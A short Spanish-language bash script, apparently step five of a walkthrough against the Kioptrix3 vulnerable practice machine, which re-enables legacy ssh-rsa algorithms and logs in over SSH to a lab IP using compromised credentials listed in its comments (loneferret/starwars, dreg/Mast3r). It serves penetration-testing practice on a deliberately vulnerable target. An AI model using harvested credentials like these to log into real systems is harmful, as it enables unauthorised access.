#!/bin/bash
# ==============================================================
# 05 - Acceso SSH con credenciales comprometidas
# --------------------------------------------------------------
# SSH moderno deshabilita los algoritmos de intercambio de clave
# legados (ssh-rsa). Para conectar con el servidor Kioptrix3
# (Ubuntu 8.04 Hardy Heron) es necesario habilitarlos
# explícitamente.
#
# Credenciales válidas para SSH:
#   loneferret / starwars
#   dreg       / Mast3r
#
# El usuario 'admin' (superuser en la web) no tiene acceso SSH.
# ==============================================================

TARGET_IP="10.0.2.26"
SSH_OPTS="-o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa"

echo "[*] Conectando como loneferret@${TARGET_IP}..."
ssh ${SSH_OPTS} loneferret@"${TARGET_IP}"
